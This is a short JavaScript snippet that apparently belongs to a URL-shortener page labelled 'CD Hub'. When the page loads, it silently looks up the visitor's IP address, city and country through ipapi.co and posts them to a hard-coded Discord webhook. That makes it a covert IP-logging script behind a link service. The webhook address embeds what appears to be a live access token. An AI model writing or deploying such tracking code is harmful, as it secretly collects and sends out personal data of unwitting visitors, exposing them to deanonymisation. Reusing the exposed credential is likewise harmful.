async function sendUserDataToWebhook() {
  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();

  const embed = {
    title: "New User Info", 
    description: "User data collected from the website visit.",
    color: 0x32CD32,
    fields: [
      { name: "IP Address", value: data.ip || 'N/A', inline: true },
      { name: "City", value: data.city || 'N/A', inline: true },
      { name: "Country", value: data.country_name || 'N/A', inline: true }
      ],
    footer: {
      text: "CD Hub - URL Shortener"
    }
  };

  const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo';

  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ embeds: [embed] }),
  });
}

window.onload = async () => {
  await sendUserDataToWebhook();
};
